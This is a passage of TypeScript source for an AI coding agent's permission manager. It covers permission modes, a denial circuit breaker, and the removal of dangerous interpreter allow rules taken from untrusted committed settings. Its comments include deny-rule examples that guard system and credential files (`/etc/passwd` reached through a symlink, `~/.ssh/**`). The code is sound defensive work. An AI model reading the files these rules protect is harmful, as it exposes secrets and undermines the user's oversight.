        this._recentDenials.length = this.MAX_RECENT_DENIALS;
      }
    }
  }

  /**
   * Report WHY an elevated "auto"/autonomy permission mode is unavailable right now,
   * or `null` when it may be entered. Consumes this manager's live denial
   * circuit-breaker state ({@link shouldAbort}) and the caller-supplied settings /
   * model capability, delegating the precedence to the pure
   * {@link classifyAutoModeUnavailableReason}. The CLI uses this to show a one-shot
   * reason-tagged notification when the user tries to switch into auto mode.
   */
  autoModeUnavailableReason(
    opts: { disabledBySettings?: boolean; modelSupportsAutoMode?: boolean } = {},
  ): AutoModeUnavailableReason | null {
    return classifyAutoModeUnavailableReason({
      // The manager's OWN managed-policy bypass killswitch ({@link setDisableBypass})
      // is a settings-category block — fold it in so the manager self-reports a
      // `settings` reason without the caller having to re-derive it. An explicit
      // `disabledBySettings` from the caller still wins when passed.
      disabledBySettings: opts.disabledBySettings ?? this._disableBypass,
      circuitBroken: this.shouldAbort(),
      modelSupportsAutoMode: opts.modelSupportsAutoMode ?? true,
    });
  }

  /**
   * Record a successful permission grant.
   * Resets the consecutive denial counter.
   */
  recordSuccess(): void {
    this.consecutiveDenials = 0;
  }

  /**
   * Check whether the circuit breaker has tripped.
   * Returns true if too many consecutive or total denials have occurred,
   * indicating the agent should abort rather than keep trying.
   */
  shouldAbort(): boolean {
    return this.consecutiveDenials >= this.MAX_CONSECUTIVE || this.totalDenials >= this.MAX_TOTAL;
  }

  /**
   * Compose the user-facing circuit-breaker warning when the denial limit has been
   * hit, or `null` while the breaker is open. When the TOTAL limit is reached it
   * reports how many actions were blocked this session; otherwise it reports the
   * consecutive run. Both end with a prompt to review the transcript. This gives
   * the user an actionable sentence explaining WHY they are suddenly being asked to
   * review, instead of a bare `shouldAbort` boolean. Mirrors the reference's
   * denial-limit warning composition (utils/permissions/permissions.ts
   * L999-L1058): the total-limit message takes precedence over the consecutive one.
   * Pure read of the live counters — does not mutate or reset them.
   */
  denialLimitWarning(): string | null {
    if (!this.shouldAbort()) return null;
    if (this.totalDenials >= this.MAX_TOTAL) {
      return `${this.totalDenials} actions were blocked this session. Please review the transcript before continuing.`;
    }
    return `${this.consecutiveDenials} consecutive actions were blocked. Please review the transcript before continuing.`;
  }

  /**
   * Reset the circuit breaker counters.
   */
  resetCircuitBreaker(): void {
    this.consecutiveDenials = 0;
    this.totalDenials = 0;
  }

  // -------------------------------------------------------------------------
  // Rule management
  // -------------------------------------------------------------------------

  /**
   * Get the current permission mode.
   */
  getMode(): PermissionMode {
    return this.mode;
  }

  /**
   * Set the permission mode.
   * Returns true if the mode was set successfully, false if blocked by policy.
   */
  setMode(mode: PermissionMode): boolean {
    if (this._disableBypass && (mode === 'bypassPermissions' || mode === 'auto-allow')) {
      this.traceMutation(`Refused mode change to '${mode}' (blocked by managed policy)`);
      return false; // blocked by managed policy
    }
    // Entering plan mode from a non-plan mode: remember the prior mode so a later
    // exit can restore it. A plan→plan no-op must NOT overwrite the memory, and
    // switching to any explicit non-plan mode clears it (the caller chose the mode).
    if (mode === 'plan') {
      if (this.mode !== 'plan') this._prePlanMode = this.mode;
    } else {
      this._prePlanMode = undefined;
    }
    const prev = this.mode;
    this.applyMode(mode, 'setMode');
    // Include the external-facing mode label so an introspection trace shows how the
    // mode is surfaced to external/SDK consumers (toExternalPermissionMode).
    this.traceMutation(`Setting mode to '${mode}' (external: ${toExternalPermissionMode(mode)}) (was '${prev}')`);
    return true;
  }

  /**
   * Register (or clear, with `undefined`) the single listener notified on every
   * real permission-mode transition. Replaces any previously-registered listener —
   * there is exactly one observer, so mode-change auditing has a single wiring point
   * and cannot be double-counted. Parity: the reference's `permissionModeListener` register.
   */
  setModeChangeListener(listener: PermissionModeChangeListener | undefined): void {
    this._modeChangeListener = listener;
  }

  /**
   * Subscribe to decision-affecting permission-state changes — a rule add/remove,
   * a mode transition, or a read-root grant/revoke — so a consumer can RE-EVALUATE
   * a decision that is already in flight. Returns an unsubscribe function.
   *
   * This is the core primitive behind the reference's `recheckPermission()`: when the
   * rules change concurrently with an open permission prompt (the user adds an allow
   * rule elsewhere, a hook applies `updatedPermissions`, a `/permissions` edit lands),
   * the still-open request re-runs {@link check} and can resolve ITSELF — allow or
   * deny — rather than forcing the user to answer now-stale UI. Multi-subscriber by
   * design (several tool-call prompts can be open simultaneously); each caller gets
   * its own unsubscribe and must call it when its prompt settles.
   */
  onPermissionStateChanged(listener: () => void): () => void {
    this._permissionStateChangeListeners.add(listener);
    return () => { this._permissionStateChangeListeners.delete(listener); };
  }

  /**
   * Fire every {@link onPermissionStateChanged} subscriber. A no-op when none are
   * registered, so the hot mutation paths (bulk startup rule loads, per-call session
   * grants) allocate and iterate nothing unless a prompt is actually waiting on a
   * recheck. Each listener is invoked defensively — a throwing subscriber must never
   * abort the mutation that triggered it (mirrors {@link applyMode}'s guarded notify).
   */
  private notifyPermissionStateChanged(): void {
    if (this._permissionStateChangeListeners.size === 0) return;
    for (const listener of [...this._permissionStateChangeListeners]) {
      try { listener(); } catch { /* a listener fault must never break a mutation */ }
    }
  }

  /**
   * The ONE place that mutates {@link mode}. Every mutation path (constructor,
   * {@link setMode}, {@link exitPlanMode}'s fallback, {@link deserialize}) routes
   * through here so a change can never bypass the {@link _modeChangeListener}
   * notification. A no-op (`next === current`) neither assigns nor notifies — only a
   * genuine transition fires the listener, so default→bubble→default-style noise is
   * suppressed, mirroring the reference's `prevMode !== newMode` diff gate. The listener is
   * invoked defensively: a throwing listener must never leave `mode` unchanged or
   * abort the caller. Returns whether a real transition occurred.
   */
  private applyMode(next: PermissionMode, reason: string): boolean {
    const previousMode = this.mode;
    if (previousMode === next) return false;
    this.mode = next;
    // Transition-time context cleanup (parity: the reference's `transitionPermissionMode`,
    // getNextPermissionMode.ts L84-100): entering a MORE permissive mode strips any
    // dangerous code-execution `allow` rule so a broad interpreter grant obtained in
    // one mode (e.g. an `acceptEdits` session grant of `Bash(python:*)`) does not
    // silently compound once the user escalates to a blanket-approve mode. Load-time
    // untrusted-source stripping already guards committed rules; this closes the
    // runtime path where an in-session dangerous grant persists across an escalation.
    // Only runs on a genuine escalation INTO a permissive mode (not when leaving one,
    // and not on the `init` seed), so a steady-state mode keeps its rules untouched.
    if (reason !== 'init' &&
        isPermissivePermissionMode(next) && !isPermissivePermissionMode(previousMode)) {
      this.stripDangerousRulesOnEscalation(next);
    }
    // Leaving plan mode must tear down any active auto-mode-during-plan: deactivate the
    // realized state and restore the rules it temporarily stripped, so a subsequent mode
    // keeps its full rule set and the classifier-screening is not silently carried out
    // of plan. Parity: the reference's transitionPermissionMode plan→non-plan path running
    // restoreDangerousPermissions + setAutoModeActive(false).
    if (previousMode === 'plan' && next !== 'plan' && this._autoModeActiveDuringPlan) {
      this._autoModeActiveDuringPlan = false;
      this.restoreAutoModeStrippedRules();
      this.traceMutation(`Deactivated auto-mode-during-plan on leaving plan mode (→ '${next}')`);
    }
    if (this._modeChangeListener) {
      const change: PermissionModeChange = {
        previousMode,
        mode: next,
        previousExternalMode: toExternalPermissionMode(previousMode),
        externalMode: toExternalPermissionMode(next),
        reason,
      };
      try {
        this._modeChangeListener(change);
      } catch {
        /* a listener failure must never break a privilege transition */
      }
    }
    // A mode transition changes what is auto-allowed/denied — let any pending recheck
    // re-evaluate an open prompt (e.g. a Shift+Tab into acceptEdits resolves a waiting
    // edit prompt). Parity: recheckPermission re-runs on mode change too.
    this.notifyPermissionStateChanged();
    return true;
  }

  /**
   * The permission mode captured when plan mode was entered, or undefined if not
   * in plan mode / none captured (the reference's ToolPermissionContext.prePlanMode).
   */
  getPrePlanMode(): PermissionMode | undefined {
    return this._prePlanMode;
  }

  /**
   * Leave plan mode, restoring the permission mode that was active before plan was
   * entered (the reference's ExitPlanMode prePlanMode restore). When not currently in
   * plan mode this is a no-op that returns the current mode. The restore is routed
   * through {@link setMode} so managed policy still applies — if the captured mode
   * was a bypass mode now forbidden by a killswitch, it falls back to 'ask'. When
   * no prior mode was captured it also falls back to 'ask'. Returns the new mode.
   */
  exitPlanMode(): PermissionMode {
    if (this.mode !== 'plan') return this.mode;
    const restore = this._prePlanMode ?? 'ask';
    this._prePlanMode = undefined;
    if (!this.setMode(restore)) {
      this.applyMode('ask', 'exitPlanMode');
    }
    return this.mode;
  }

  /**
   * Enable or disable the bypass-permissions guard.
   * When enabled, setMode() rejects 'bypassPermissions' and 'auto-allow'.
   *
   * `reason` is an optional human-readable explanation stored for the operator
   * (surfaced via {@link disableBypassReason} and, through
   * {@link autoModeUnavailableReason}, the Shift+Tab/auto-mode notification). It is
   * recorded only when disabling and cleared when re-enabling, so a stale reason
   * never lingers once the guard is lifted. Mirrors the reference's reason-differentiated
   * auto-mode-unavailable wording (settings vs circuit-breaker vs org-allowlist).
   */
  setDisableBypass(disable: boolean, reason?: string): void {
    this._disableBypass = disable;
    this._disableBypassReason = disable ? reason : undefined;
  }

  /**
   * Check whether bypass is disabled by managed policy.
   */
  isDisableBypass(): boolean {
    return this._disableBypass;
  }

  /**
   * The human-readable reason bypass/auto-allow is blocked, or `undefined` when
   * bypass is permitted (or was disabled without a reason). Lets `/permissions`
   * and the Shift+Tab message explain WHY auto-allow cannot be entered instead of
   * showing a bare `bypassDisabled` boolean the operator cannot act on. Parity:
   * the reference's `getAutoModeUnavailableNotification(reason)`.
   */
  disableBypassReason(): string | undefined {
    return this._disableBypassReason;
  }

  /**
   * Mark whether bypass-permissions mode was available when the session started
   * (the reference's `isBypassPermissionsModeAvailable`). The CLI sets this from a launch
   * flag; when true, a `plan`-mode run inherits bypass semantics in {@link check}.
   */
  setBypassModeAvailable(available: boolean): void {
    this._bypassModeAvailable = available;
  }

  /**
   * Whether bypass-permissions mode is available for this session (gates plan-mode
   * bypass inheritance). Mirrors the reference's ToolPermissionContext field.
   */
  isBypassModeAvailable(): boolean {
    return this._bypassModeAvailable;
  }

  /**
   * Get the current rule list.
   */
  getRules(): PermissionRule[] {
    return [...this.rules];
  }

  /**
   * Whether a rule can be edited/removed by the user. A rule loaded from managed/
   * enterprise policy ({@link isManagedPermissionSource}) is read-only; every other
   * source is user-editable. Lets a rule-management UI disable edit/delete and show
   * {@link ruleReadOnlyNotice} for locked rules. Parity: the reference's PermissionRuleList
   * policy-rule lockdown.
   */
  isRuleEditable(rule: PermissionRule): boolean {
    return !isManagedPermissionSource(rule.source);
  }

  /**
   * The read-only detail notice for a managed/policy rule, or `null` when the rule
   * is user-editable. Delegates to the pure {@link managedRuleReadOnlyNotice}.
   */
  ruleReadOnlyNotice(rule: PermissionRule): string | null {
    return managedRuleReadOnlyNotice(rule.source);
  }

  /**
   * Add a rule. It is prepended so that later-added rules take priority.
   * Under the managed-rules-only lockdown, a non-`policySettings` rule is refused
   * (a runtime session/CLI grant cannot bypass managed policy).
   */
  addRule(rule: PermissionRule): void {
    if (this._managedRulesOnly && !isManagedPermissionSource(rule.source)) {
      this.traceMutation(`Refused ${rule.action} rule (managed-rules-only lockdown): ${describeRule(rule)}`);
      return;
    }
    // Reject a bash ALLOW rule whose pattern bakes in a shell-DYNAMIC construct
    // ($(...), backtick, ${...}, $VAR, or a backslash path fragment): such a token
    // makes a persisted allow match MORE/different commands than the user saw, so it
    // must never become a reusable grant (parity: the reference's staticPrefix sanitization
    // of dynamic args before emitting a persistent prefix rule). Deny/ask rules are
    // unaffected — a dynamic token there only widens what is BLOCKED/PROMPTED, which
    // is not a privilege-escalation hazard.
    if (rule.action === 'allow' && normalizeToolName(rule.tool) === 'bash') {
      const dyn = dynamicAllowPatternToken(rule.pattern);
      if (dyn) {
        this.traceMutation(`Refused bash allow rule with a dynamic ${dyn} token (would over-match): ${describeRule(rule)}`);
        return;
      }
    }
    // Dedup: skip a rule already present under a normalized identity (so a legacy/
    // alias tool name — e.g. `Bash` — is recognized as the same rule as `bash`),
    // mirroring the reference's normalized-Set dedup in addPermissionRulesToSettings
    // (permissionsLoader.ts L244-L285). Prevents duplicate grants accumulating
    // across repeated "always allow" clicks or applyPermissionUpdate re-runs.
    const key = this.ruleDedupKey(rule);
    if (this.rules.some(r => this.ruleDedupKey(r) === key)) return;
    this.rules.unshift(rule);
    this.traceMutation(`Adding ${rule.action} rule: ${describeRule(rule)}`);
    // A new rule can flip an open prompt's decision (e.g. an allow rule the user just
    // added elsewhere) — let any pending recheck re-evaluate. Parity: recheckPermission.
    this.notifyPermissionStateChanged();
  }

  /**
   * Stable identity key for {@link addRule} dedup: the canonical rule-value string
   * (tool name normalized via {@link normalizeToolName} + paren-escaped pattern, so a
   * legacy alias matches its canonical form) plus action, source tier, and any
   * structured paramPattern. Two rules with the same key are duplicates.
   */
  private ruleDedupKey(rule: PermissionRule): string {
    const value = permissionRuleValueToString({ toolName: normalizeToolName(rule.tool), ruleContent: rule.pattern });
    const param = rule.paramPattern
      ? JSON.stringify(Object.keys(rule.paramPattern).sort().map(k => [k, rule.paramPattern![k]]))
      : '';
    return `${value}\0${rule.action}\0${rule.source ?? ''}\0${param}`;
  }

  /**
   * Does an EXPLICIT deny apply to this call — a previously-recorded denial, or
   * a matching rule (first match wins, like check()) whose action is 'deny'?
   *
   * Unlike check(), this deliberately ignores mode-level decisions
   * ('deny-all' / default 'ask'). Read-only tools are safe by
   * design and must keep running under those modes (detached mode defaults to
   * 'deny-all' yet relies on read-only tools), so the read-only path uses this
   * to honor only a rule/denial the user set explicitly — closing the gap where
   * an explicit `{tool:'grep', action:'deny'}` rule was silently bypassed.
   */
  /**
   * Match a rule's tool field against a tool name, supporting glob/prefix
   * wildcards (e.g. `github:*` to scope a rule to one MCP server) in addition to
   * exact names and `*`. Lets allow/deny rules target a namespace without the
   * over-broad `{tool:'*'}` grant.
   */
  private toolNameMatches(ruleTool: string, toolName: string): boolean {
    // Canonicalize legacy/cross-framework names (e.g. a `Bash`/`Edit` rule
    // imported from a reference settings file matches AMI's `bash`/`file_edit`).
    const rt = normalizeToolName(ruleTool);
    if (rt === '*' || rt === toolName) return true;
    if (rt.includes('*') && matchPattern(rt, toolName)) return true;
    // MCP server-level rule: a rule naming only the server (`mcp__server`) matches
    // EVERY tool from that server (`mcp__server__tool1`, `mcp__server__tool2`, …),
    // exactly like the explicit `mcp__server__*` form (already handled by the glob
    // branch above). A bare `mcp__server` carries no wildcard, so without this it
    // would match nothing. Mirrors the reference's toolMatchesRule MCP special-case
    // (utils/permissions/permissions.ts): rule-info toolName undefined/`*` + same
    // server ⇒ match.
    const ruleInfo = mcpInfoFromString(rt);
    const toolInfo = mcpInfoFromString(toolName);
    return (
      ruleInfo !== null &&
      toolInfo !== null &&
      (ruleInfo.toolName === undefined || ruleInfo.toolName === '*') &&
      ruleInfo.serverName === toolInfo.serverName
    );
  }

  /** Coerce a persisted paramPattern into a validated Record<string,string>,
   *  dropping non-string values (a malformed {"model":123} must not load as a
   *  rule that matches nothing-or-everything). Returns undefined if nothing valid. */
  private sanitizeParamPattern(raw: unknown): Record<string, string> | undefined {
    if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return undefined;
    const entries = Object.entries(raw as Record<string, unknown>);
    if (entries.length === 0) return undefined;
    // Strict: if ANY value is non-string the pattern is malformed. Keeping only
    // the valid subset would silently widen the rule (fewer constraints → more
    // matches), so reject the whole thing (loadRules then skips the rule).
    const out: Record<string, string> = {};
    for (const [k, v] of entries) {
      if (typeof v !== 'string') return undefined;
      out[k] = v;
    }
    return out;
  }

  /**
   * True when a bash `allow` rule's content is an over-broad code-execution
   * prefix (interpreter / package-runner / shell — see dangerous-code-exec.ts).
   * Such a rule grants arbitrary code execution and is downgraded to a prompt in
   * the rule-evaluated modes by check(). A narrow/specific rule returns false.
   */
  private isDangerousCodeExecAllow(rule: PermissionRule): boolean {
    return rule.action === 'allow' && normalizeToolName(rule.tool) === 'bash' &&
      isDangerousCodeExecPrefix(rule.pattern);
  }

  /**
   * The code-execution allow rule (if any) that matched this bash command and
   * caused check()'s allow→ask downgrade — used by deriveDecisionReason to
   * attribute the 'ask' verdict. `isDangerousCodeExecAllow` already constrains the
   * rule to `allow` + bash + a non-empty dangerous prefix, so `rule.pattern` is
   * defined for any candidate.
   */
  private matchingCodeExecAllowRule(
    input: Record<string, unknown>,
    command: string,
  ): PermissionRule | undefined {
    for (const rule of this.rules) {
      if (rule.action !== 'allow' || !this.isDangerousCodeExecAllow(rule)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      if (matchBashPattern(rule.pattern!, command, 'allow')) return rule;
    }
    return undefined;
  }

  /**
   * Introspection: the active `allow` rules whose content is an over-broad
   * code-execution prefix and that check() therefore downgrades to a prompt in
   * `ask` / `acceptEdits` modes. Lets a UI / diagnostic surface explain which
   * user rules are being treated as code-execution escape hatches rather than
   * silent auto-approvals. Mirrors the reference's `findDangerousClassifierPermissions`.
   */
  getDangerousCodeExecAllowRules(): PermissionRule[] {
    return this.rules.filter(r => this.isDangerousCodeExecAllow(r));
  }

  /**
   * Remove dangerous code-exec `allow` rules that originate from an UNTRUSTED,
   * shared/committable settings tier ({@link isSharedSettingSource} minus the
   * enterprise-managed `policySettings` tier, which is admin-owned and trusted) and
   * record them in {@link strippedDangerousRules}. A committed `.ami/permissions.json`
   * (or a slash-command's frontmatter) is attacker-PR-able, so a broad interpreter
   * grant it carries must never silently widen auto-approval — the check() code-exec
   * downgrade only moves such a rule to a prompt, whereas a hostile project rule
   * should not exist at all. Personal tiers (user/local/cliArg/session) and an
   * untagged rule are the user's own and are left intact. Returns the newly
   * stripped rules. Parity: the reference's dangerous-rule stripping into
   * `ToolPermissionContext.strippedDangerousRules`.
   */
  private stripDangerousRulesFromUntrustedSources(): PermissionRule[] {
    const stripped: PermissionRule[] = [];
    this.rules = this.rules.filter(r => {
      const untrustedShared = isSharedSettingSource(r.source) && !isManagedPermissionSource(r.source);
      if (untrustedShared && this.isDangerousCodeExecAllow(r)) {
        stripped.push(r);
        return false;
      }
      return true;
    });
    if (stripped.length > 0) {
      this.strippedDangerousRules.push(...stripped);
      for (const r of stripped) {
        this.traceMutation(`Stripped dangerous code-execution allow rule from an untrusted source: ${describeRule(r)}`);
      }
    }
    return stripped;
  }

  /**
   * Transition-time cleanup invoked by {@link applyMode} on escalation INTO a
   * permissive mode: drop every dangerous code-execution `allow` rule (regardless of
   * source tier) so a broad interpreter grant cannot compound with a blanket-approve
   * mode. Unlike {@link stripDangerousRulesFromUntrustedSources} (load-time, shared
   * untrusted tiers only), this fires at runtime on the actual escalation and also
   * covers an in-session grant. Stripped rules are recorded in
   * {@link strippedDangerousRules} for introspection and each is traced. Returns the
   * rules removed. Parity: the reference's `transitionPermissionMode` dangerous-permission
   * cleanup (getNextPermissionMode.ts L84-100).
   */
  private stripDangerousRulesOnEscalation(enteringMode: PermissionMode): PermissionRule[] {
    const stripped: PermissionRule[] = [];
    this.rules = this.rules.filter(r => {
      if (this.isDangerousCodeExecAllow(r)) {
        stripped.push(r);
        return false;
      }
      return true;
    });
    if (stripped.length > 0) {
      this.strippedDangerousRules.push(...stripped);
      for (const r of stripped) {
        this.traceMutation(`Stripped dangerous code-execution allow rule on escalation to '${enteringMode}': ${describeRule(r)}`);
      }
    }
    return stripped;
  }

  /**
   * Introspection: dangerous code-exec `allow` rules that were stripped from
   * untrusted shared settings tiers at load time ({@link stripDangerousRulesFromUntrustedSources}).
   * Lets a diagnostic / UI report WHICH committable rules were refused and why.
   */
  getStrippedDangerousRules(): PermissionRule[] {
    return [...this.strippedDangerousRules];
  }

  /**
   * Temporarily strip EVERY dangerous code-exec `allow` rule (any tier) to activate
   * auto-mode-during-plan, stashing them in {@link _autoModeStrippedRules} so they can
   * be restored verbatim when auto mode is deactivated. Unlike
   * {@link stripDangerousRulesOnEscalation} (permanent, recorded in
   * {@link strippedDangerousRules}), this is a REVERSIBLE strip: while auto mode runs
   * the classifier must not be bypassed by a prefix-rule allow, but leaving auto mode
   * puts the user's rules back. Idempotent-safe — a re-strip (settings re-sync while
   * already active) just captures any newly re-added disk rules. Parity: the reference's
   * stripDangerousPermissionsForAutoMode (permissionSetup.ts).
   */
  private stripDangerousRulesForAutoMode(): PermissionRule[] {
    const stripped: PermissionRule[] = [];
    this.rules = this.rules.filter(r => {
      if (this.isDangerousCodeExecAllow(r)) {
        stripped.push(r);
        return false;
      }
      return true;
    });
    if (stripped.length > 0) {
      this._autoModeStrippedRules.push(...stripped);
      for (const r of stripped) {
        this.traceMutation(`Stripped dangerous code-execution allow rule for auto-mode-during-plan: ${describeRule(r)}`);
      }
      this._memo?.clear();
      this.notifyPermissionStateChanged();
    }
    return stripped;
  }

  /**
   * Restore the rules previously stripped by {@link stripDangerousRulesForAutoMode}
   * (auto-mode deactivation, or leaving plan mode). Re-appends the stash and clears
   * it. A no-op (preserving ref-equality of {@link rules}) when nothing is stashed.
   * Parity: the reference's restoreDangerousPermissions (permissionSetup.ts) replaying
   * strippedDangerousRules back as `addRules`.
   */
  private restoreAutoModeStrippedRules(): PermissionRule[] {
    if (this._autoModeStrippedRules.length === 0) return [];
    const restored = [...this._autoModeStrippedRules];
    this._autoModeStrippedRules = [];
    this.rules.push(...restored);
    for (const r of restored) {
      this.traceMutation(`Restored auto-mode-stripped rule on auto-mode deactivation: ${describeRule(r)}`);
    }
    this._memo?.clear();
    this.notifyPermissionStateChanged();
    return restored;
  }

  /**
   * Reconcile auto-mode-during-plan state against the on-disk setting after a
   * permission-context rebuild (a settings change). Compares the DESIRED state
   * ({@link _useAutoModeDuringPlan}, re-read from disk by {@link loadTieredRules})
   * against the REALIZED state ({@link _autoModeActiveDuringPlan}) and
   * activates/deactivates auto mode — stripping or restoring dangerous code-exec
   * rules — so toggling `useAutoModeDuringPlan` mid-plan takes effect immediately.
   *
   * No-op when NOT in plan mode (auto-during-plan only applies while planning), and —
   * mirroring the reference's entry-time exclusion — never activates when plan mode was
   * entered from `bypassPermissions` (a dangerous mode must not silently gain the
   * classifier). When the desire is unchanged and auto is already active, it RE-STRIPS,
   * because {@link syncRulesFromDisk} re-adds disk rules (including a trusted-tier
   * `Bash(python:*)`) that must not reopen a classifier bypass. Returns a structured
   * summary of what changed for introspection. Parity: the reference's transitionPlanAutoMode
   * (permissionSetup.ts), called from applySettingsChange (applySettingsChange.ts:L68).
   */
  transitionPlanAutoMode(): { activated?: boolean; deactivated?: boolean; restripped?: boolean } {
    if (this.mode !== 'plan') return {};
    if (this._prePlanMode === 'bypassPermissions') return {};
    const want = this._useAutoModeDuringPlan;
    const have = this._autoModeActiveDuringPlan;
    if (want && have) {
      this.stripDangerousRulesForAutoMode();
      this.traceMutation('Re-stripped dangerous rules for still-active auto-mode-during-plan after settings sync');
      return { restripped: true };
    }
    if (!want && !have) return {};
    if (want) {
      this._autoModeActiveDuringPlan = true;
      this.stripDangerousRulesForAutoMode();
      this.traceMutation('Activated auto-mode-during-plan on settings reconciliation');
      return { activated: true };
    }
    this._autoModeActiveDuringPlan = false;
    this.restoreAutoModeStrippedRules();
    this.traceMutation('Deactivated auto-mode-during-plan on settings reconciliation');
    return { deactivated: true };
  }

  /**
   * Introspection: whether auto-mode screening is currently ACTIVE during plan mode
   * ({@link _autoModeActiveDuringPlan}). Lets a diagnostic / `/permissions` surface
   * report that plan-mode tool calls are being screened by the classifier rather than
   * held to the pure read-only allowlist. Parity: the reference's
   * autoModeState.isAutoModeActive().
   */
  isAutoModeActiveDuringPlan(): boolean {
    return this._autoModeActiveDuringPlan;
  }

  /**
   * Introspection: the DESIRED `useAutoModeDuringPlan` setting last read from disk
   * ({@link _useAutoModeDuringPlan}). Exposes the intent independently of the realized
   * {@link isAutoModeActiveDuringPlan} state (they can differ between a settings edit
   * and the next {@link transitionPlanAutoMode} reconciliation).
   */
  getUseAutoModeDuringPlan(): boolean {
    return this._useAutoModeDuringPlan;
  }

  /**
   * Introspection: active `allow` rules that auto-approve EVERY bash command (a
   * pattern-less / `*` bash allow, or an all-tools `*` allow — the YOLO
   * equivalent). Lets a diagnostic / `/doctor` surface report WHICH rules silently
   * blanket-approve bash. Mirrors the reference's `findOverlyBroadBashPermissions`
   * (utils/permissions/permissionSetup.ts L378-412). Uses the single canonical
   * {@link isOverlyBroadBashAllowRule} detector (shared with cli config-resolver).
   */
  findOverlyBroadBashAllowRules(): PermissionRule[] {
    return this.rules.filter(r => isOverlyBroadBashAllowRule(r));
  }

  /**
   * Strip overly-broad bash `allow` rules that originate from an UNTRUSTED,
   * shared/committable settings tier ({@link isSharedSettingSource} minus the
   * admin-owned `policySettings`), recording them in
   * {@link strippedOverlyBroadBashRules}. A committed `.ami/permissions.json` (or a
   * slash-command's frontmatter) is attacker-PR-able, so a blanket `Bash` / `Bash(*)`
   * allow it carries must never silently grant the whole team YOLO bash auto-approval
   * — a hostile project rule of that breadth should not exist at all. Personal tiers
   * (user/local/cliArg/session) and an untagged rule are the user's own explicit
   * grant and are left intact. Returns the newly stripped rules. Parity: the reference's
   * `removeDangerousPermissions(findOverlyBroadBashPermissions(...))` re-run after a
   * settings sync (utils/settings/applySettingsChange.ts L50-59).
   */
  private stripOverlyBroadBashAllowRules(): PermissionRule[] {
    const stripped: PermissionRule[] = [];
    this.rules = this.rules.filter(r => {
      const untrustedShared = isSharedSettingSource(r.source) && !isManagedPermissionSource(r.source);
      if (untrustedShared && isOverlyBroadBashAllowRule(r)) {
        stripped.push(r);
        return false;
      }
      return true;
    });
    if (stripped.length > 0) {
      this.strippedOverlyBroadBashRules.push(...stripped);
      for (const r of stripped) {
        this.traceMutation(`Stripped overly-broad bash allow rule from an untrusted source: ${describeRule(r)}`);
      }
    }
    return stripped;
  }

  /**
   * Introspection: overly-broad bash allow rules stripped from untrusted shared
   * settings tiers at load / settings-sync time ({@link stripOverlyBroadBashAllowRules}).
   * Lets a diagnostic / UI report WHICH committable blanket-bash grants were refused.
   */
  getStrippedOverlyBroadBashRules(): PermissionRule[] {
    return [...this.strippedOverlyBroadBashRules];
  }

  /** All named-param globs in a rule's paramPattern must match the tool input. */
  private paramMatches(paramPattern: Record<string, string>, input: Record<string, unknown>): boolean {
    for (const [key, glob] of Object.entries(paramPattern)) {
      const v = input[key];
      if (typeof v !== 'string' || !matchPattern(glob, v)) return false;
    }
    return true;
  }

  /**
   * M9: does ANY deny rule match this call, regardless of rule order? A matching
   * deny UNCONDITIONALLY wins over allow/ask. Unlike hasExplicitDeny (first-match,
   * returns the first matching rule's action), this scans the WHOLE rule list for a
   * deny, so an earlier allow can never shadow a later deny.
   *
   * `skipParamPattern` preserves the auto-allow fast-path's long-standing behavior
   * of ignoring structured paramPattern rules (they are enforced by the ordered
   * rule loop in check()'s rule-evaluated modes, not by the auto-allow fast-path).
   */
  private anyDenyMatches(
    toolName: string,
    input: Record<string, unknown>,
    skipParamPattern = false,
  ): boolean {
    // The file-path match forms (symlink-hop resolution, a fresh Set + lstat/
    // readlink syscall walk) and the case-insensitivity flag depend only on
    // toolName+input, not on the rule — so resolve them AT MOST ONCE, lazily on the
    // first file-path deny rule encountered, and reuse across all rules. This avoids
    // re-walking the symlink chain per deny rule while keeping bash-only / zero-match
    // calls completely syscall-free.
    let ci: boolean | undefined;
    let forms: string[] | undefined;
    for (const rule of this.rules) {
      if (rule.action !== 'deny') continue;
      if (skipParamPattern && rule.paramPattern) continue;
      if (!this.toolNameMatches(rule.tool, toolName)) continue;
      if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
      if (rule.pattern) {
        if (toolName === 'bash' && typeof input.command === 'string') {
          if (matchBashPattern(rule.pattern, input.command, 'deny')) return true;
        } else {
          // File-path tools: match the rule against the literal path AND every
          // symlink-resolved form so a deny cannot be bypassed via an in-workspace
          // symlink to a denied target.
          if (forms === undefined) {
            ci = this.pathRuleCaseInsensitive(toolName);
            forms = this.fileRuleMatchStrings(toolName, input);
          }
          for (const form of forms) {
            if (matchPattern(rule.pattern, form, ci!)) return true;
          }
        }
      } else {
        return true;
      }
    }
    return false;
  }

  /**
   * True when a FILE-PATH tool's deny pattern should be matched case-insensitively:
   * on a case-insensitive filesystem (macOS/Windows), `/x/.SSH/k` and `/x/.ssh/k`
   * name the SAME file, so a deny rule written in one casing must still block the
   * other — otherwise the deny is bypassable by a trivial case variation. No-op on a
   * case-sensitive FS (Linux) and for non-path tools (bash/grep are case-sensitive).
   * Mirrors the reference's `matchWildcardPattern(..., caseInsensitive)` usage.
   */
  private pathRuleCaseInsensitive(toolName: string): boolean {
    return FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName)) && isCaseInsensitiveFs();
  }

  /**
   * The path strings a FILE-PATH deny/ask RULE must be matched against: the raw
   * input path AND every symlink hop of its resolved real path
   * ({@link getPathsForPermissionCheck}). An in-workspace symlink pointing at a
   * denied target (`./link -> /etc/passwd`, `file_read(./link)`) must be caught by
   * a `file_read(/etc/**)` deny rule even though the literal argument is `./link`.
   * For a non-file tool (or when no file path is present) this is just the single
   * canonical input string, so bash/other rule matching is unchanged. Mirrors
   * the reference's getPathsForPermissionCheck threaded through deny/ask rule matching
   * (utils/permissions/filesystem.ts L1081-1101).
   */
  private fileRuleMatchStrings(toolName: string, input: Record<string, unknown>): string[] {
    const base = this.inputToString(toolName, input);
    if (!FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName))) return [base];
    const fp = input.file_path ?? input.path;
    if (typeof fp !== 'string' || !fp) return [base];
    const forms = new Set<string>([base]);
    try {
      for (const hop of getPathsForPermissionCheck(expandPath(fp, process.cwd()))) forms.add(hop);
    } catch { /* resolution failure (e.g. a non-existent write target) — literal only */ }
    return [...forms];
  }

  /**
   * ADDITIVE per-root match for a FILE-PATH rule whose pattern is written in a
   * ROOTED form (`//abs/**`, `~/.ssh/**`, `/src/**`) that AMI's raw-glob matcher
   * cannot resolve against an absolute candidate path. Resolves the pattern against
